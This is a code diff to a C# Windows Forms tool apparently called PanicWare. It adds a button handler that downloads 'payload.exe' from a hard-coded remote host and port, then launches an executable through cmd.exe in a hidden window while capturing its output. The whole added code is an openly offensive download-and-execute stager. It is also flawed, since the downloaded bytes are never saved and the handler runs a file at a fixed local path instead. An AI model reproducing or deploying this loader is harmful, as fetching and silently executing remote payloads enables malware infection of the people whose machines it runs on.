@@ -336,9 +336,64 @@ namespace PanicWareGui.Forms
             }
         }
 
+        private async void RunShellcodeLoadbtn_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                string url = "http://192.168.202.128:8080/payload.exe";
 
+                byte[] payloadBytes;
+                using (WebClient client = new WebClient())
+                {
+                    payloadBytes = await client.DownloadDataTaskAsync(new Uri(url));
+                    MessageBox.Show("Downloaded payload.exe into memory", "Download Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    Console.WriteLine("Downloaded payload.exe into memory");
+                }
 
+                // Save the payload to a temporary file
+                string customDirectory = @"C:\Users\kyria\Desktop\github\Panicware\test";
+                string tempFilePath = Path.Combine(customDirectory, "payload.exe");
+                /*string tempFilePath = Path.Combine(Path.GetTempPath(), "payload.exe");
+                File.WriteAllBytes(tempFilePath, payloadBytes); // Synchronous version*/
 
+                // Create a new process to run the payload with parameters
+                System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo
+                {
+                    FileName = "cmd.exe",
+                    Arguments = $"/c {tempFilePath} -h",  // Adjust parameters as necessary
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    CreateNoWindow = true
+                };
 
+                using (System.Diagnostics.Process process = new System.Diagnostics.Process())
+                {
+                    process.StartInfo = psi;
+                    process.Start();
+                    string output = await process.StandardOutput.ReadToEndAsync();
+                    string error = await process.StandardError.ReadToEndAsync();
+                    process.WaitForExit();
+
+                    // Display the output and error (if any) in the console or message box
+                    if (!string.IsNullOrEmpty(output))
+                    {
+                        Console.WriteLine($"Output: {output}");
+                        MessageBox.Show(output, "Output", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    }
+
+                    if (!string.IsNullOrEmpty(error))
+                    {
+                        Console.WriteLine($"Error: {error}");
+                        MessageBox.Show(error, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"Failed to download or execute payload: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                Console.WriteLine($"Failed to download or execute payload: {ex.Message}");
+            }
+        }
     }
 }
